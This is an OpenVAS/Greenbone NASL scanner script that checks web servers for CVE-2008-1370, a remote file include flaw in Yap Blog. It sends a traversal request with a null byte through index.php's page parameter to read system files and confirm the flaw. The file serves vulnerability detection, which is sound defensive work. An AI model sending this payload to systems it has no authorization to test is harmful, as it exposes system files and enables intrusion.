if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100046" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2008-1370" );
	script_bugtraq_id( 28120 );
	script_name( "Yap Blog 'index.php' Remote File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/28120" );
	script_tag( name: "summary", value: "Yap Blog is prone to a remote file-include vulnerability because it
  fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue may allow an attacker to compromise the
  application and the underlying system. Other attacks are also possible." );
	script_tag( name: "affected", value: "Versions prior to Yap Blog 1.1.1 are vulnerable." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/blog", "/yap", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for pattern in keys( files ) {
		file = files[pattern];
		url = NASLString( dir, "/index.php?page=/", file, "%00" );
		if( http_vuln_check( port: port, url: url, pattern: pattern, check_header: TRUE ) ){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
		else {
			url = NASLString( dir, "/index.php?page=rss.php%00" );
			if(http_vuln_check( port: port, url: url, pattern: "Cannot modify header information - headers already sent.*", check_header: FALSE )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 0 );

